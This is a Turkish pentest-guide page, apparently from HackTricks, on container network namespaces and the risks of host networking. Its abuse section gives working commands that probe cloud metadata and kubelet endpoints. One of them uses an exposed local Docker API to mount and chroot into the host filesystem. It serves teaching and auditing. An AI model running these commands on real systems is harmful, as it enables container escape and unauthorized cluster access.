# Ağ İsim Alanı

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Ağ isim alanı, arayüzler, IP adresleri, yönlendirme tabloları, ARP/neighbor durumu, güvenlik duvarı kuralları, soketler ve `/proc/net` gibi dosyaların içeriği gibi ağ ile ilgili kaynakları izole eder. Bu yüzden bir konteyner, host'un gerçek ağ yığınına sahip olmadan kendi `eth0`'ı, kendi yerel yönlendirmeleri ve kendi loopback cihazı varmış gibi görünebilir.

Güvenlik açısından bunun önemi, ağ izolasyonunun sadece port bağlamadan çok daha fazlası olmasıdır. Özel bir ağ isim alanı, iş yükünün doğrudan gözlemleyebileceklerini veya yeniden yapılandırabileceklerini sınırlar. Bu isim alanı host ile paylaşıldığında, konteyner aniden host dinleyicilerine, host-yerel servislere ve uygulamaya asla açılmaması gereken ağ kontrol noktalarına görünürlük kazanabilir.

## İşleyiş

Yeni oluşturulmuş bir ağ isim alanı, arayüzler eklenene kadar boş veya neredeyse boş bir ağ ortamıyla başlar. Konteyner çalışma zamanları sonra sanal arayüzler oluşturur veya bağlar, adres atar ve iş yükünün beklenen bağlantısallığa sahip olması için yönlendirmeleri yapılandırır. Köprü tabanlı dağıtımlarda bu genellikle konteynerin, host köprüsüne bağlı veth destekli bir arayüz görmesi anlamına gelir. Kubernetes'te, CNI eklentileri Pod ağı için eşdeğer kurulumu yönetir.

Bu mimari, `--network=host` veya `hostNetwork: true`'nun neden bu kadar dramatik bir değişiklik olduğunu açıklar. Hazırlanmış özel bir ağ yığını almak yerine, iş yükü host'un gerçek ağ yığınına katılır.

## Laboratuvar

Neredeyse boş bir ağ isim alanını şu şekilde görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ve normal ve host-networked containers'ı şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host ağı paylaşan konteyner artık kendi izole soket ve arayüz görünümüne sahip değildir. Bu değişiklik tek başına, sürecin hangi yeteneklere sahip olduğunu sormadan önce bile önemli sonuçlar doğurur.

## Çalışma Zamanı Kullanımı

Docker ve Podman normalde aksi yapılandırılmadıkça her konteyner için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a kendi network namespace'ini verir; bu namespace Pod içindeki konteynerler tarafından paylaşılır fakat host'tan ayrıdır. Incus/LXC sistemleri de genellikle daha çeşitli virtual networking düzenleriyle birlikte network-namespace tabanlı zengin izolasyon sağlar.

Genel ilke, özel ağın varsayılan izolasyon sınırı olmasıdır; host networking ise bu sınırdan açıkça vazgeçilmesidir.

## Yanlış Yapılandırmalar

En önemli yanlış yapılandırma basitçe host network namespace'inin paylaşılmasıdır. Bu bazen performans, düşük seviyeli izleme veya kullanım kolaylığı için yapılır, ama konteynerlere sunulan en temiz sınırlarından birini ortadan kaldırır. Host-yerel dinleyiciler daha doğrudan erişilebilir hale gelir, localhost-only servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi yetenekler artık daha tehlikeli olur çünkü sağladıkları işlemler şimdi host'un kendi ağ ortamına uygulanır.

Başka bir sorun da network namespace özel olsa bile ağla ilgili yeteneklerin fazla verilmesidir. Özel bir namespace yardımcı olur, ancak bu raw sockets veya gelişmiş ağ kontrollerini zararsız hale getirmez.

## Kötüye Kullanım

Zayıf izolasyonlu kurulumlarda saldırganlar host üzerindeki dinleyici servisleri inceleyebilir, yalnızca loopback'e bağlı yönetim uç noktalarına ulaşabilir, belirli yeteneklere ve ortama bağlı olarak trafiği dinleyebilir veya müdahale edebilir ya da `CAP_NET_ADMIN` varsa yönlendirme ve firewall durumunu yeniden yapılandırabilir. Bir cluster'da, bu aynı zamanda lateral movement ve control-plane keşfini kolaylaştırabilir.

Eğer host networking'den şüpheleniyorsanız, görünür arayüzlerin ve dinleyicilerin izole bir konteyner ağına değil host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services genellikle ilk ilginç keşiflerdir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ağ yetenekleri mevcutsa, iş yükünün görünür stack'i inceleyip değiştirebildiğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Cluster veya cloud ortamlarında, host networking ayrıca metadata ve control-plane-adjacent services için hızlı yerel recon yapılmasını haklı çıkarır:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Tam Örnek: Host Networking + Yerel Runtime / Kubelet Erişimi

Host networking otomatik olarak host root erişimi sağlamaz, ancak genellikle yalnızca node'un kendisinden erişilebilir olması amaçlanan servisleri açığa çıkarır. Bu servislerden biri zayıf korunuyorsa, host networking doğrudan bir ayrıcalık yükseltme yoluna dönüşür.

Docker API localhost'ta:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet localhost'ta:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Etkiler:

- yerel bir runtime API uygun şekilde korunmadan açığa çıkarsa doğrudan host ele geçirilmesi
- kubelet veya yerel ajanlara erişilebiliyorsa cluster keşfi veya yanal hareket
- `CAP_NET_ADMIN` ile birleştiğinde trafik manipülasyonu veya denial of service

## Kontroller

Bu kontrollerin amacı, sürecin özel bir ağ yığınına sahip olup olmadığını, hangi rotaların ve dinleyicilerin görünür olduğunu ve yetenekleri test etmeden önce ağ görünümünün zaten host-benzeri görünüp görünmediğini öğrenmektir.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Eğer namespace identifier veya görünen arayüz seti host gibi görünüyorsa, host networking zaten kullanılıyor olabilir.
- `ss -lntup` özellikle değerlidir çünkü yalnızca loopback dinleyicilerini ve yerel yönetim uç noktalarını ortaya çıkarır.
- Yönlendirmeler, arayüz adları ve firewall bağlamı, `CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa çok daha önemli hale gelir.

Bir container'ı incelerken, network namespace'i her zaman capability set ile birlikte değerlendirin. Host networking ile güçlü ağ yetkilerinin birleşimi, bridge networking ile dar varsayılan yetki kümesinden çok farklı bir duruş sergiler.
